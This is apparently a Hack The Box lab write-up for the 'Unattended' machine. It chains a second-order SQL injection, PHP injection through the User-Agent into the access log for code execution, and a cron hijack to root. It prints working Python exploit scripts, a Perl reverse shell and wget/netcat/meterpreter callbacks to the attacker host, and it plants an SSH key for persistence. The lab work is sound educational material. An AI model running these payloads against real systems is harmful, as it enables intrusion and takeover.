---
layout: single
title: Unattended - Hack The Box
excerpt: "Unattended was a pretty tough box with a second order SQL injection in the PHP app. By injecting PHP code into the web server access logs through the User-Agent header, I can get RCE by including the logs using the SQL injection. I didn't quite understand what the priv esc was about though. I found the initrd archive and stumbled upon the contents by doing a grep on the box author's name."
date: 2019-08-24
classes: wide
header:
  teaser: /assets/images/htb-writeup-unattended/unattended_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - vhost
  - linux
  - sqli
  - sqlmap
  - 2nd order injection
  - php
  - lfi
  - ipv6
  - firewall
  - uinitrd
---

![](/assets/images/htb-writeup-unattended/unattended_logo.png)

Unattended was a pretty tough box with a second order SQL injection in the PHP app. By injecting PHP code into the web server access logs through the User-Agent header, I can get RCE by including the logs using the SQL injection. I didn't quite understand what the priv esc was about though. I found the initrd archive and stumbled upon the contents by doing a grep on the box author's name.

## Summary

- Get the vhost from the SSL certificate information
- Enumerate the website to find that the only parameter that seems dynamic is the `id` parameter
- Run sqlmap against the site and find both a boolean-blind and time-based boolean injection in the `id` parameter
- Slowly dump what seems to be the most relevant tables: `config`, `idnames` and `filepath`
- Based on the information found, assume that the included page from PHP is the results of two SQL queries
- Construct a 2nd order SQL injection to get a LFI
- Inject PHP code in the NGINX `access.log` and use the LFI to point to the code and get RCE
- Obtain a PHP meterpreter by downloading a msfvenom payload through PHP `system()` and `wget`
- Find that we have write access in the `/var/lib/php/sessions` directory and drop a perl reverse shell there
- Modify the table `config`, change the `checkrelease` parameter to point to the reverse shell perl script
- Wait for the cronjob to run and get a shell as `guly`
- Find that the server has an IPv6 address and that SSH is not firewalled on IPv6
- Check groups that `guly` is part of, find that he is part of `grub` which is not a standard Debian group
- Look for files owned by group `grub`, find `/boot/initrd.img-4.9.0-8-amd64`
- Download, unpack the file, find a `uinitrd` binary which is not standard in Debian
- Search for box maker name (guly) in the unpacked files and find comment followed by `/sbin/uinitrd c0m3s3f0ss34nt4n1` in `cryptoroot` file
- Can't execute `uinitrd` on the box because of permissions but we can upload our own copy and execute it from `/home/guly`
- Output is 40 characters hex. By passing the `c0m3s3f0ss34nt4n1` argument we get a different SHA1 output
- The 40 characters hex string output is the root password and can `su` root with it

### Portscan

There's not much running on this box but I make note of the `www.nestedflanders.htb` SSL certificate name. I'll add this to my `/etc/hosts` file as well as other subdomains like `admin.*`, `dev.*`, etc. in case I need them later.

```
# nmap -sC -sV -p- 10.10.10.126
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-13 19:01 EDT
Nmap scan report for 10.10.10.126
Host is up (0.0067s latency).
Not shown: 65533 filtered ports
PORT    STATE SERVICE  VERSION
80/tcp  open  http     nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: 503 Service Temporarily Unavailable
443/tcp open  ssl/http nginx 1.10.3
| ssl-cert: Subject: commonName=www.nestedflanders.htb
| Not valid before: 2018-12-19T09:43:58
|_Not valid after:  2021-09-13T09:43:58
```

### Web site enumeration - Port 80

The default page on the Port 80 web server returns a single dot.

![](/assets/images/htb-writeup-unattended/dot.png)

Nothing interesting is returned from gobuster so I won't include the output here.

### Web site enumeration - Port 443

The default apache page is shown here.

![](/assets/images/htb-writeup-unattended/default.png)

The response contains the `X-Upstream: 127.0.0.1:8080` header which indicates that Nginx is probably fronting the HTTPS page and proxying back to Apache2 on the backend.

There's also a `index.php` and `/dev/` page which I found by running gobuster.

```
# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php -k -t 10 -u https://www.nestedflanders.htb
/dev (Status: 301)
/index.php (Status: 200)
```

The `/dev/` doesn't have anything interesting. I check the vhost `dev.nestedflanders.htb` but that doesn't seem valid and I get directed to the page with the single dot.

![](/assets/images/htb-writeup-unattended/dev.png)

The `index.php` shows the followings pages that are included with the `id` parameter.

![](/assets/images/htb-writeup-unattended/ned1.png)

![](/assets/images/htb-writeup-unattended/ned2.png)

![](/assets/images/htb-writeup-unattended/ned3.png)

There's nothing at first glance that seems dynamic other than the `id` parameter used to include pages. After manually trying other parameters, I find that the `name` parameter is used by the page to change the name displayed and is vulnerable to XSS. It's a reflected XSS so I don't see how this would be useful here. Moving on.

### Finding the first SQL injection

![](/assets/images/htb-writeup-unattended/xss.png)

Next, I run `sqlmap` on the page to see if I can find a SQL injection in the `id` parameter. I find that the database backend is MySQL and that the page contains two SQL injections: a boolean-based blind and time-based boolean injection. Originally when I first ran sqlmap with `id=25` it only found that time-based blind injection but when I specified the `id=587` it found both. I think this happens because the default page returned by index.php is the one from id 25, so the boolean-blind injection can only work with the other two pages.

```
# sqlmap -u https://www.nestedflanders.htb/index.php?id=587 -p id
[...]
sqlmap identified the following injection point(s) with a total of 288 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=587' AND 5533=5533 AND 'BkIC'='BkIC

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=587' AND SLEEP(5) AND 'kUKZ'='kUKZ
---
[00:51:04] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.10.3
back-end DBMS: MySQL >= 5.0.12
```

The boolean-blind injection is faster to dump the database and is less susceptible to instability if other people are hammering the box. First I check the current database used, then dump the list of tables from database `neddy`:

```
# sqlmap -u https://www.nestedflanders.htb/index.php?id=587 --current-db
[...]
[00:54:27] [INFO] retrieved: neddy
current database:    'neddy'
```

```
# sqlmap -u https://www.nestedflanders.htb/index.php?id=587 --tables -D neddy
[...]
Database: neddy
[11 tables]
+--------------+
| config       |
| customers    |
| employees    |
| filepath     |
| idname       |
| offices      |
| orderdetails |
| orders       |
| payments     |
| productlines |
| products     |
+--------------+
```

I'll focus on `config`, `idname` and `filepath` tables first. The other tables contain a lot of rows and it would take too long to dump everything. I increase the thread count to make it a bit faster.

```
# sqlmap -u https://www.nestedflanders.htb/index.php?id=587 -T config,filepath,idname --technique B -D neddy --dump --threads 10
[...]
Table: config
+-----+-------------------------+--------------------------------------------------------------------------+
| id  | option_name             | option_value                                                             |
+-----+-------------------------+--------------------------------------------------------------------------+
| 54  | offline                 | 0                                                                        |
| 55  | offline_message         | Site offline, please come back later                                     |
| 56  | display_offline_message | 0                                                                        |
| 57  | offline_image           | <blank>                                                                  |
| 58  | sitename                | NestedFlanders                                                           |
| 59  | editor                  | tinymce                                                                  |
| 60  | captcha                 | 0                                                                        |
| 61  | list_limit              | 20                                                                       |
| 62  | access                  | 1                                                                        |
| 63  | debug                   | 0                                                                        |
| 64  | debug_lang              | 0                                                                        |
| 65  | dbtype                  | mysqli                                                                   |
| 66  | host                    | localhost                                                                |
| 67  | live_site               | <blank>                                                                  |
| 68  | gzip                    | 0                                                                        |
| 69  | error_reporting         | default                                                                  |
| 70  | ftp_host                | 127.0.0.1                                                                |
| 71  | ftp_port                | 21                                                                       |
| 72  | ftp_user                | flanders                                                                 |
| 73  | ftp_pass                | 0e1aff658d8614fd0eac6705bb69fb684f6790299e4cf01e1b90b1a287a94ffcde451466 |
| 74  | ftp_root                | /                                                                        |
| 75  | ftp_enable              | 1                                                                        |
| 76  | offset                  | UTC                                                                      |
| 77  | mailonline              | 1                                                                        |
| 78  | mailer                  | mail                                                                     |
| 79  | mailfrom                | nested@nestedflanders.htb                                                |
| 80  | fromname                | Neddy                                                                    |
| 81  | sendmail                | /usr/sbin/sendmail                                                       |
| 82  | smtpauth                | 0                                                                        |
| 83  | smtpuser                | <blank>                                                                  |
| 84  | smtppass                | <blank>                                                                  |
| 85  | smtppass                | <blank>                                                                  |
| 86  | checkrelease            | /home/guly/checkbase.pl;/home/guly/checkplugins.pl;                      |
| 87  | smtphost                | localhost                                                                |
| 88  | smtpsecure              | none                                                                     |
| 89  | smtpport                | 25                                                                       |
| 90  | caching                 | 0                                                                        |
| 91  | cache_handler           | file                                                                     |
| 92  | cachetime               | 15                                                                       |
| 93  | MetaDesc                | <blank>                                                                  |
| 94  | MetaKeys                | <blank>                                                                  |
| 95  | MetaTitle               | 1                                                                        |
| 96  | MetaAuthor              | 1                                                                        |
| 97  | MetaVersion             | 0                                                                        |
| 98  | robots                  | <blank>                                                                  |
| 99  | sef                     | 1                                                                        |
| 100 | sef_rewrite             | 0                                                                        |
| 101 | sef_suffix              | 0                                                                        |
| 102 | unicodeslugs            | 0                                                                        |
| 103 | feed_limit              | 10                                                                       |
| 104 | lifetime                | 1                                                                        |
| 105 | session_handler         | file                                                                     |
+-----+-------------------------+--------------------------------------------------------------------------+
[...]
Table: idname
+-----+-------------+----------+
| id  | name        | disabled |
+-----+-------------+----------+
| 1   | main.php    | 1        |
| 2   | about.php   | 1        |
| 3   | contact.php | 1        |
| 25  | main        | 0        |
| 465 | about       | 0        |
| 587 | contact     | 0        |
+-----+-------------+----------+
[...]
Table: filepath
+---------+--------------------------------------+
| name    | path                                 |
+---------+--------------------------------------+
| about   | 47c1ba4f7b1edf28ea0e2bb250717093.php |
| contact | 0f710bba8d16303a415266af8bb52fcb.php |
| main    | 787c75233b93aa5e45c3f85d130bfbe7.php |
+---------+--------------------------------------+
[...]

```

Here are my observations for each of the table:

- `config`: There's a lot of data here, including some potential credentials in `ftp_pass`. There's also a `checkrelease` option that points to a perl script in `/home/guly/`
- `idname`: That table contains the mapping between the ID specified in the GET request and a name
- `filepath`: The name from the previous table seems to be referenced here in this table

### Second order SQL injection

I have the database table with some possible credentials but there's nothing else open on this box except HTTP and HTTPS and I haven't found any other hidden directory and/or vhost. There's possibly a service listening on an IPv6 address but I don't know the address and I can't scan the entire /64 because that address space is too large to scan.

The MD5 hash of the last two entries in the filepath table are the md5sum of the strings `submission` and `smtp`. Thinking that this was a hint, I hashed a couple of wordlists and ran those through wfuzz but was unsuccesfull in finding any other files.

I don't have the PHP source code but I can guess that there are two SQL queries being issued from index.php: one to map the ID to the name, and another one to map the name to the filename. If I can perform an injection on the first query, I can probably do the same on the second one and control which file gets included by the PHP code, basically getting an LFI.

I don't like testing SQL injections within Burp so I made a script to help me with the process:

```python
import readline
import requests

proxies = { "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080" }

while True:
    cmd = raw_input("> ")
    payload = cmd
    payload = payload + "-- -"
    print payload
    r = requests.get("https://www.nestedflanders.htb/index.php?id=%s" % payload, proxies=proxies, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    print soup.body
```

The first thing I test is to check if I can display the Contact page by returning `contact` instead of `main` from the first query against the `idname` table.

This is the query I want to run against the `idname` table: `SELECT name FROM idname WHERE id = '25' UNION SELECT ALL 'contact'`

Output from my script below:
```
# python sqli.py
> 25' union select all 'contact'
[...]
<body class="container">
Hello visitor,<br/>

thanks for getting in touch with us!<br/>
Unfortunately our server is under *heavy* attack and we disable almost every dynamic page.<br/>
Please come back later.
```

Ok, so that was successful and the Contact page was returned so the first injection worked. What I want to do now is inject another SQL injection in the `name` field returned instead of the actual name value so I can use the same UNION SELECT injection on the 2nd query and return a filename of my choosing.

This is the query I want to run against the `filepath` table: `SELECT path FROM filepath WHERE name = 'invalid' UNION SELECT ALL '/etc/passwd'`.

I made another script to do this:

```python
from bs4 import BeautifulSoup
import readline
import requests

proxies = { "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080" }

while True:
    file = raw_input("> ")
    payload = "25' union select all \"%s\" -- -" % ("invalid' union select all '" + file)
    r = requests.get("https://www.nestedflanders.htb/index.php?id=%s" % payload, proxies=proxies, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    print soup.body
```

The 2nd query now returns a file name that I control and I can read files on the target system:

```
# python sqli3.py
> /etc/passwd
[...]
<!-- <div align="center"> -->
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
messagebus:x:105:109::/var/run/dbus:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
guly:x:1000:1000:guly,,,:/home/guly:/bin/bash
mysql:x:107:112:MySQL Server,,,:/nonexistent:/bin/false
```

### Gaining RCE on the system through code PHP injection in the access logs

I have access to the nginx access logs and I can see that the `User-Agent` header is included in the logs:
```
> /var/log/nginx/access.log
10.10.14.23 - - [14/Apr/2019:21:31:24 -0400] "GET /index.php?id=25'%20union%20select%20all%20%22invalid'%20union%20select%20all%20'/etc/issue%22%20--%20- HTTP/1.1" 200 423 "-" "python-requests/2.18.4"
10.10.14.23 - - [14/Apr/2019:21:32:38 -0400] "GET /index.php?id=25'%20union%20select%20all%20%22invalid'%20union%20select%20all%20'/etc/passwd%22%20--%20- HTTP/1.1" 200 925 "-" "python-requests/2.18.4"
10.10.14.23 - - [14/Apr/2019:21:38:00 -0400] "GET /index.php?id=25'%20union%20select%20all%20%22invalid'%20union%20select%20all%20'/home/guly/user.txt%22%20--%20- HTTP/1.1" 200 398 "-" "python-requests/2.18.4"
```

I control the `User-Agent` header so I can potentially inject PHP code in the access logs and trigger it by making a request to the log file using the LFI from the SQL injection. After some trial and error I find that Iwe can inject any PHP code I want in the `User-Agent` header and that the `system` function is not disabled. To make sure I don't end up with too much PHP statements in the access logs and kill the box, I reset the content of the access log file every time I run a command.

Here's the script I made to execute commands. I could have put more regex in there to clean up the output a bit more but that'll do for now.

```python
#!/usr/bin/python

from bs4 import BeautifulSoup
import re
import readline
import requests

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = { "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080" }

while True:
    cmd = raw_input("> ")
    headers = { "User-Agent": "<?php system('echo **BEGIN** > /var/log/nginx/access.log; %s'); ?>**END**" % cmd}
    r = requests.get("http://10.10.10.126/", headers=headers)
    file = "/var/log/nginx/access.log"
    payload = "25' union select all \"%s\" -- -" % ("invalid' union select all '" + file)
    r = requests.get("https://www.nestedflanders.htb/index.php?id=%s" % payload, proxies=proxies, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    m = re.search("\*\*BEGIN\*\*(.*)\*\*END\*\*", str(soup.body), flags=re.DOTALL)
    if m:
        print m.group(1)
    else:
        print("No output")
```

I have RCE as `www-data`:
```
# python rce.py
> id
**
10.10.14.23 - - [14/Apr/2019:21:59:41 -0400] "GET / HTTP/1.1" 200 2 "-" "uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Python and netcat are not installed on this box. I tried using perl to spawn a shell but I kept killing the box (bad code injected in the access log? so I tried downloading netcat and spawn a shell that way.
```
> wget http://10.10.14.23/nc -O /tmp/nc

> chmod 777 /tmp/nc

> ls -l /tmp/nc

10.10.14.23 - - [14/Apr/2019:22:08:26 -0400] "GET / HTTP/1.1" 200 2 "-" "-rwxrwxrwx 1 www-data www-data 442856 Apr 14 14:22 /tmp/nc

> /tmp/nc -e /bin/sh 10.10.14.23 80

[No output!]
```

I download netcat on the box but I don't get any callback when I try to execute it. When I look at the filesystem mounts I see that the temporary locations are all mounted as `noexec` so I can't run any binary that I upload there.

```
> mount
**
10.10.14.23 - - [14/Apr/2019:22:00:14 -0400] "GET / HTTP/1.1" 200 2 "-" "/dev/mapper/sda2_crypt on / type ext4 (rw,relatime,errors=remount-ro,data=ordered)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev,noexec)
[...]
tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /var/tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)
/dev/sda1 on /boot type ext2 (rw,relatime,block_validity,barrier,user_xattr,acl)
tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /var/tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)
```

### First shell using Metasploit

If I upload a PHP meterpreter payload into `/tmp` I can execute it since the `php` binary is in the main partition that is executable.

```
> wget http://10.10.14.23:443/snowscan.php -O /tmp/snowscan.php

> php /tmp/snowscan.php
```

I get a meterpreter session a few seconds after.

```
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.23:80
[*] Encoded stage with php/base64
[*] Sending encoded stage (51106 bytes) to 10.10.10.126
[*] Meterpreter session 1 opened (10.10.14.23:80 -> 10.10.10.126:47394) at 2019-04-15 02:18:34 -0400

msf5 exploit(multi/handler) > sessions 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: www-data (33)
```

The first thing I do once I have a shell is check if I can access `user.txt` but the `/home/guly` directory isn't readble by `www-data`. Next I grab the MySQL credentials from `/var/www/html/index.php`:

```
$servername = "localhost";
$username = "nestedflanders";
$password = "1036913cf7d38d4ea4f79b050f171e9fbf3f5e";
$db = "neddy";
$conn = new mysqli($servername, $username, $password, $db);
```

I don't have an interactive TTY so I have to issue queries directly from the shell.

```
mysql -u nestedflanders -p1036913cf7d38d4ea4f79b050f171e9fbf3f5e -e "show tables" neddy

Tables_in_neddy
config
customers
employees
filepath
idname
offices
orderdetails
orders
payments
productlines
products
```

### Escalating to a new shell as user guly

I thought about that `checkrelease` parameter in the `config` table I saw earlier. It currently contains `/home/guly/checkbase.pl;/home/guly/checkplugins.pl;` so I guess that this may be a script running at specific interval. I have access to the database so I can change this value.

I use the standard perl reverse shell payload, then drop it into `/var/lib/php/sessions` since it's the only directory in the main executable partition I have write access to:

```perl
use Socket;$i="10.10.14.23";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
```

```
wget http://10.10.14.23:443/shell.pl -O /var/lib/php/sessions/shell.pl
--2019-04-14 22:25:39--  http://10.10.14.23:443/shell.pl
Connecting to 10.10.14.23:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 209 [text/x-perl]
Saving to: '/var/lib/php/sessions/shell.pl'
```

Then I update the database configuration to point to the new script:

```
mysql -u nestedflanders -p1036913cf7d38d4ea4f79b050f171e9fbf3f5e -e "update config set option_value = '/usr/bin/perl /var/lib/php/sessions/shell.pl;' where id='86'" neddy
mysql -u nestedflanders -p1036913cf7d38d4ea4f79b050f171e9fbf3f5e -e "select * from config where id='86'" neddy
id	option_name	option_value
86	checkrelease	/usr/bin/perl /var/lib/php/sessions/shell.pl;
```

After a minute or two I get a connection back:

```
root@ragingunicorn:~/htb/unattended# nc -lvnp 80
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.126.
Ncat: Connection from 10.10.10.126:47400.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(guly) gid=1000(guly) groups=1000(guly),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),47(grub),108(netdev)

$ cat user.txt
9b413f...
```

IPv6 is configured on this server so I will run an nmap scan against the IPv6 address to see if I can find any other open port.

```
$ ip a
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
    link/ether 00:50:56:b2:7b:c2 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.126/24 brd 10.10.10.255 scope global ens33
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb2:7bc2/64 scope global mngtmpaddr dynamic
       valid_lft 86215sec preferred_lft 14215sec
    inet6 fe80::250:56ff:feb2:7bc2/64 scope link
       valid_lft forever preferred_lft forever
```

As expected, I find SSH listening:

```
# nmap -6 -p- dead:beef::250:56ff:feb2:7bc2
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-15 02:34 EDT
Nmap scan report for dead:beef::250:56ff:feb2:7bc2
Host is up (0.0081s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 11.48 seconds
```

I'll add my SSH public keys to guly's SSH directory so I can log back in later:

```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+SZ75RsfVTQxRRbezIJn+bQgNifXvjMWfhT1hJzl/GbTbykFtGPTwuiA5NAcPKPG25jkQln3J8Id2ngapRuW8i8OvM+QBuihsM9wLxu+my0JhS/aNHTvzJF0uN1XkvZj/BkbjUpsF9k6aMDaFoaxaKBa7ST2ZFpxlbu2ndmoB+HuvmeTaCmoY/PsxgDBWwd3GiRNts2HOiu74DEVt0hHbJ7kwhkR+l0+6VS74s+7SjP+N1q+oih83bjwM8ph+9odqAbh6TGDTbPX2I+3lTzCUeGS9goKZe05h/YtB2U2VbH1pxJZ1rfR1Sp+SBS+zblO9MUxvbzQoJTHpH2jeDg89 root@ragingunicorn" > .ssh/authorized_keys
```

From here I will use the SSH shell instead so I have a TTY:

```
root@ragingunicorn:~# ssh guly@dead:beef::250:56ff:feb2:7bc2
guly@unattended:~$ id
uid=1000(guly) gid=1000(guly) groups=1000(guly),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),47(grub),108(netdev)
```

### Priv esc

I check the groups that `guly` is a member of and the `grub` group seems suspicious to me. According to [https://wiki.debian.org/SystemGroups](https://wiki.debian.org/SystemGroups) this isn't a standard group.

I'll do a search for files owned by the `grub` group and find a single file: `/boot/initrd.img-4.9.0-8-amd64`

```
guly@unattended:~$ find / -group grub 2>/dev/null
/boot/initrd.img-4.9.0-8-amd64
```

I download the file to my Kali VM:

```
# scp -6 guly@\[dead:beef::250:56ff:feb2:7bc2\]:/boot/initrd.img-4.9.0-8-amd64 .
initrd.img-4.9.0-8-amd64

# file initrd.img-4.9.0-8-amd64
initrd.img-4.9.0-8-amd64: gzip compressed data, last modified: Thu Dec 20 22:50:39 2018, from Unix, original size 62110208
```

This is a compressed file, I'll gunzip it first:

```
# mv initrd.img-4.9.0-8-amd64 initrd.img-4.9.0-8-amd64.gz
# gunzip initrd.img-4.9.0-8-amd64.gz
# file initrd.img-4.9.0-8-amd64
initrd.img-4.9.0-8-amd64: ASCII cpio archive (SVR4 with no CRC)
```

Then unpack the cpio archive in a separate folder:

```
# mv initrd.img-4.9.0-8-amd64 tmp

root@ragingunicorn:~/htb/unattended/tmp# cpio -i < initrd.img-4.9.0-8-amd64
121309 blocks
root@ragingunicorn:~/htb/unattended/tmp# ls -l
total 60704
drwxr-xr-x 2 root root     4096 Apr 15 02:42 bin
drwxr-xr-x 2 root root     4096 Apr 15 02:42 boot
drwxr-xr-x 3 root root     4096 Apr 15 02:42 conf
drwxr-xr-x 5 root root     4096 Apr 15 02:42 etc
-rwxr-xr-x 1 root root     5960 Apr 15 02:42 init
-rw-r----- 1 root root 62110208 Apr 15 02:40 initrd.img-4.9.0-8-amd64
drwxr-xr-x 8 root root     4096 Apr 15 02:42 lib
drwxr-xr-x 2 root root     4096 Apr 15 02:42 lib64
drwxr-xr-x 2 root root     4096 Apr 15 02:42 run
drwxr-xr-x 2 root root     4096 Apr 15 02:42 sbin
drwxr-xr-x 8 root root     4096 Apr 15 02:42 scripts
```

There's a lot of files in there and nothing standards out at first. Doing a search for `guly` (the box creator name) I find an interesting file:

```
root@ragingunicorn:~/htb/unattended/tmp# grep -r -A 5 -B 5 guly *
Binary file initrd.img-4.9.0-8-amd64 matches
--
scripts/local-top/cryptroot-			fi
scripts/local-top/cryptroot-		fi
scripts/local-top/cryptroot-
scripts/local-top/cryptroot-
scripts/local-top/cryptroot-		if [ ! -e "$NEWROOT" ]; then
scripts/local-top/cryptroot:      # guly: we have to deal with lukfs password sync when root changes her one
scripts/local-top/cryptroot-      if ! crypttarget="$crypttarget" cryptsource="$cryptsource" \
scripts/local-top/cryptroot-        /sbin/uinitrd c0m3s3f0ss34nt4n1 | $cryptopen ; then
scripts/local-top/cryptroot-				message "cryptsetup: cryptsetup failed, bad password or options?"
scripts/local-top/cryptroot-				sleep 3
scripts/local-top/cryptroot-				continue
```

The `/sbin/uinitrd c0m3s3f0ss34nt4n1` entry is very peculiar. If I do a google search on `c0m3s3f0ss34nt4n1` I don't find anything so I assume this has been created or modified on purpose. I can't find any man file for `uinitrd` and googling doesn't find anything conclusive. I was expecting to find this is a standard Linux command but it doesn't seem to be the case.

Also, `c0m3s3f0ss34nt4n1` = `comesefosseantani` and the box creator is Italian...

I don't have access to run this on the box itself:

```
guly@unattended:~$ /sbin/uinitrd
-bash: /sbin/uinitrd: Permission denied
guly@unattended:~$ ls -l /sbin/uinitrd
-rwxr-x--- 1 root root 933240 Dec 20 16:50 /sbin/uinitrd
```

Running it locally on my VM I get more Italian:

```
# ./uinitrd
supercazzola
```

Let's see what happens if I upload my copy to the server and execute it:

```
root@ragingunicorn:~/htb/unattended# scp -6 tmp/sbin/uinitrd guly@\[dead:beef::250:56ff:feb2:7bc2\]:unitrd
uinitrd
```

I get some SHA-1 output when I run the binary. The output changes depending on the string I pass as argument:

```
guly@unattended:~$ ./unitrd
c26625fb20563604795b161c6f64b41539e3ec63

guly@unattended:~$ ./unitrd 123
772fdeb165b85e3f395b903c57014f4c6c0ab133

guly@unattended:~$ ./unitrd 123456
d98e9572902fce6c98942ffab1bbd3a6d51ff31c

guly@unattended:~$ ./unitrd 123456
d98e9572902fce6c98942ffab1bbd3a6d51ff31c
```

Those look like SHA1 hashes but I don't know what they mean. I try the first one as the root password but it doesn't work.

However when I run the program with the `c0m3s3f0ss34nt4n1` argument, I am able to `su` as root with the hash I got:

```
guly@unattended:~$ ./unitrd c0m3s3f0ss34nt4n1
132f93ab100671dcb263acaf5dc95d8260e8b7c6
guly@unattended:~$ su -
Password:
root@unattended:~# id
uid=0(root) gid=0(root) groups=0(root)
root@unattended:~# cat root.txt
559c0e...
```